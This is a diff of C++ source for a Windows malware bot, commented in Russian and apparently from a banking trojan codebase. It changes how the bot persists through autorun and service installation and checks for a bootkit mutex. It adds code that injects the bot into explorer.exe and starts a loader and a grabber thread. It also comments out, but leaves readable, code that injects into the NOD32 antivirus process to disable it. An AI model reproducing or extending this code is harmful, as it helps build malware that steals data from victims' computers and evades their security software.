@@ -20,9 +20,10 @@
 #include "BotDef.h"
 #include "DbgRpt.h"
 #include "Modules.h"
+
+
+
 #include "BotDebug.h"
-
-
 
 //********************** Отладочные шаблоны **********************************
 
@@ -90,28 +91,30 @@ void InternalAddToAutorun()
 	// только в случае если в системе не зарегистрирован мьютекс
 	// сигнализирующий об успешной установке буткита
 	#ifndef DEBUGBOT
-	if (!WSTR::IsEmpty(TempFileName))
-	{
 		const static char ButkitMutex[] = {'b', 'k', 't', 'r', 'u', 'e',  0};
 		HANDLE Mutex = (HANDLE)pOpenMutexA(SYNCHRONIZE, TRUE, (PCHAR)ButkitMutex);
 		if (Mutex != NULL)
 		{
+			if (Mutex != NULL)
+			{
 				pCloseHandle(Mutex);
 				MDBG("Main", "Буткит установлен. Игнорируем добавление в автозагрузку.");
 				return;
+			}
 		}
 
-		
-		PCHAR Name = WSTR::ToAnsi(TempFileName, 0);
+		bool ServiceInstalled = false;
+		if (!WSTR::IsEmpty(TempFileName))
+		{
+				PCHAR Name = WSTR::ToAnsi(TempFileName, 0);
+				BOT::AddToAutoRun(Name);
+				ServiceInstalled = BOT::InstallService(Name);
+				STR::Free(Name);
+		}
+		if (!ServiceInstalled)
+			BOT::InstallService(BOT::GetBotFullExeName().t_str());
 
-		MDBG("Main", "Добавляем бот в автозагрузку.");
-
-		BOT::InstallService(Name);
-		BOT::AddToAutoRun(Name);
-		STR::Free(Name);
-	}
 	#endif
-
 }
 
 void DeleteDropper() // убиваем процесс, стираем файл
@@ -192,9 +195,11 @@ DWORD WINAPI LoaderRoutine( LPVOID lpData )
 		}
 
     }
+	pExitProcess(0);
 	return 0;
 }
 
+/*
 static DWORD WINAPI NOD32Dll(void*)
 {
 	BOT::InitializeApi();
@@ -210,11 +215,16 @@ static DWORD WINAPI NOD32Dll(void*)
 	}
 	return 0;
 }
+*/
 
 void ExplorerMain()
 {
 	MDBG("Main", "----------------- ExplorerMain -----------------");
 	MDBG("Main", "WorkPath %s  WorkPathHash %d", BOT::GetWorkPathInSysDrive() ,BOT::GetWorkFolderHash());
+
+	// Создаем мьютекс запущенного бота для сигнализации другим 
+	// способам автозапуска.
+	BOT::TryCreateBotInstance();
 
 	if ( !dwExplorerSelf )
 		UnhookDlls();
@@ -224,9 +234,9 @@ void ExplorerMain()
 
 	MDBG( "Main", "Отключаем NOD32" );
 //	OffNOD32();
-	DWORD dwPid = GetProcessIdByName("ekrn.exe");
-	MDBG( "Main", "NOD32Dll() pid %d", dwPid );
-	InjectIntoProcess2( dwPid, NOD32Dll );
+//	DWORD dwPid = GetProcessIdByName("ekrn.exe");
+//	MDBG( "Main", "NOD32Dll() pid %d", dwPid );
+//	InjectIntoProcess2( dwPid, NOD32Dll );
 
 	InternalAddToAutorun();
 
@@ -235,17 +245,12 @@ void ExplorerMain()
 
 	//----------------------------------------------------
 
-	// Создаем мьютекс запущенного бота для сигнализации другим 
-	// способам автозапуска.
-	BOT::TryCreateBotInstance();
-
-
 	if ( !dwAlreadyRun )
 		MegaJump( LoaderRoutine );
 	
 	#ifdef GrabberH
 		if ( dwFirst && !dwGrabberRun )
-			MegaJump( GrabberThread );
+			MegaJump( GrabberThread ); 
 	#endif
 
 	//MegaJump(AvFuckThread);
@@ -267,6 +272,7 @@ void ExplorerMain()
 DWORD WINAPI ExplorerRoutine( LPVOID lpData )
 {
 	BOT::Initialize();
+
 	UnhookDlls();
 	
 	if (dwExplorerSelf) 
@@ -289,27 +295,36 @@ int APIENTRY MyMain()
 {
 	BOT::Initialize();
 
+	MDBG("Main", "Запускается бот. Версия бота %s\r\nEXE: %s", BOT_VERSION, Bot->ApplicationName().t_str());
+
 	// Проверяем сервис запущен или нет
 	if (BOT::IsService())
 	{
+		MDBG("Main", "Стартует сервис");
 		// Если бот ещё не  запущен, то выполняем инжект в эксплорер
 		BOT::SetBotType(BotService);
 
 		if (!BOT::IsRunning())
 		{
 			//JmpToExplorer(ExplorerRoutine);
+			MDBG("Main", "Сервис инжектится в Explorer");
+			JmpToExplorer(ExplorerRoutine);
 		}
 
 		BOT::ExecuteService();
 		pExitProcess(0);
+		return 0;
 	}
 
+	MDBG("Main", "Звпускается Ring3 версия бота");
+	// Запускается ринг3 версия
 	BOT::SetBotType(BotRing3);
 
 	// Проверяем не запущен ли на данном компьютере другой экземпляр бота
 	if (BOT::IsRunning())
 	{
 		pExitProcess(0);
+		return 0;
 	}
 
 
